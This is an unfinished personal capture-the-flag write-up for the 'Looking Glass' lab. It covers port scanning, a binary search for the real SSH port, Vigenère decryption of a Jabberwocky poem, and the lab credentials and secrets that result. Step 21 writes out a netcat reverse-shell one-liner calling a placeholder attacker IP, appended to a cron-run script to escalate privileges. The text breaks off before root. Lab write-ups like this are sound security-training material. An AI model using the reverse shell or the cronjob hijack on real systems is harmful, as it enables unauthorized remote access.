WIP
> Climb through the Looking Glass and capture the flags.
#### Steps
1. I started with a basic nmap scan `nmap -sV IP -v` and discovered 80 open ports
```shell
9575/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9593/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9594/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9595/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9618/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9666/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9876/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9877/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9878/tcp  open  ssh        Dropbear sshd (protocol 2.0)
...
```
2. Most were running `ssh`, but a few were running `jetdirect`, which is a network protocol for the HP JetDirect printer
```shell
9100/tcp  open  jetdirect?
9101/tcp  open  jetdirect?
9102/tcp  open  jetdirect?
9103/tcp  open  jetdirect?
```
3. However, after connecting to all of them with `netcat` I foud that they also appeared to be running ssh (or it's a front? who knows)
```shell
└─$ nc 10.10.79.42 9103
SSH-2.0-dropbear
^C
```
4. At this point i decided to look at the hint
> O(log n) A looking glass is a mirror. <br>
5. I found an explanation for O(log n) [here](https://stackoverflow.com/questions/2307283/what-does-olog-n-mean-exactly)
```
O(log n): Given a person's name, find the phone number by picking a random point about halfway through the part of the book you
haven't searched yet, then checking to see whether the person's name is at that point. Then repeat the process about halfway
through the part of the book where the person's name lies. (This is a binary search for a person's name.)
```
6. Which essentially says that one port is not like the others, and we use this algorithm to figure out which one to pursue
7. To enumerate further, I tried connecting to ssh directly for a couple ports, since it only took ssh-rsa, I had to modify my usual command
```shell
└─$ ssh 10.10.79.42 -p 9099 
Unable to negotiate with 10.10.79.42 port 9099: no matching host key type found. Their offer: ssh-rsa
                                                                                                                                                            

└─$ ssh 10.10.79.42 -p 9099 -oHostKeyAlgorithms=+ssh-rsa
The authenticity of host '[10.10.79.42]:9099 ([10.10.79.42]:9099)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.79.42]:9099' (RSA) to the list of known hosts.
Lower
Connection to 10.10.79.42 closed.
```
8. Note the **lower** undeneath the known hosts message
9. Because of the mirroring hint, lower means higher
10. For example, it it says 12000 higher and 11000 lower, the port is between those two, so following the algorithm you check 11500 next
11. After wayyy too many tries, I finally found the correct port. *Note that non standard ports are used as well, so you have to check basically all of them*
```shell
└─$ ssh 10.10.79.42 -p 11659 -oHostKeyAlgorithms=+ssh-rsa
The authenticity of host '[10.10.79.42]:11659 ([10.10.79.42]:11659)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
    ~/.ssh/known_hosts:20: [hashed name]
    ~/.ssh/known_hosts:21: [hashed name]
    ~/.ssh/known_hosts:22: [hashed name]
    ~/.ssh/known_hosts:23: [hashed name]
    ~/.ssh/known_hosts:24: [hashed name]
    ~/.ssh/known_hosts:25: [hashed name]
    ~/.ssh/known_hosts:26: [hashed name]
    (16 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.79.42]:11659' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

[ ETC ]

Enter Secret:
```
12. Looking at the text I assume it some type of alphabet encoding
13. I tried vigenere with jabberwocky as the key, but that didn't work. It also didn't work with any common rotation methods
14. It really did seem like vigenere because of how the words were structured, so I tried to bruteforce the key with [this site](https://www.boxentriq.com/code-breaking/vigenere-cipher?source=post_page-----a72c7dcc5250--------------------------------) instead
15. The first run didn't work so I increased the max key length and ran it again
```
key: thealphabetcipher
text:
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```
16. After inputting the secret, we get the creds `jabberwock:QuiteNurseChortledRidiculous`
17. I connected to the default ssh port `ssh jabberwock@10.10.79.42 -oHostKeyAlgorithms=+ssh-rsa `
18. Then I catted `user.txt` which was backwards so I reversed it with `echo '[contents]' | rev`
19. Also in the jabberwock home direcotory was a poem and a shell script to output the poem
20. Time to escalate to root. I started by running `sudo -l` to check privs
```shell
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```
21. Going back to the poem shell script from earlier, it is run as a cronjob by tweedledum and is run on reboot. If we modify that to contain a payload, we can elevate to tweedledum
```shell
# set up the rev shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc [ATTACK IP] 7777 >/tmp/f' >> twasBrillig.sh

# set up a listener
nc -lvnp 7777

# reboot
sudo /sbin/reboot
```
22. On tweedledums shell, there is a text file `humptydumpty.txt` that contains hex code. Decoding it we find a password `zyxwvutsrqponmlk`, so we su to humptydumpty with this password
23. At this poitn I went back into the `/home` directory to check just how many users are left to escalate through
24. I saw that the `jabberwock` directory had very strange permissions
```shell
drwxrwxrwx 5 jabberwock jabberwock  4096 Jul  3 03:19 jabberwock
```
25. Alice is similar in that files are executable by everyone, but not writeable
26. (imma be real at this point the machine shut me out and I realllllllly don't want to search for the port again so I'll be back maybe)
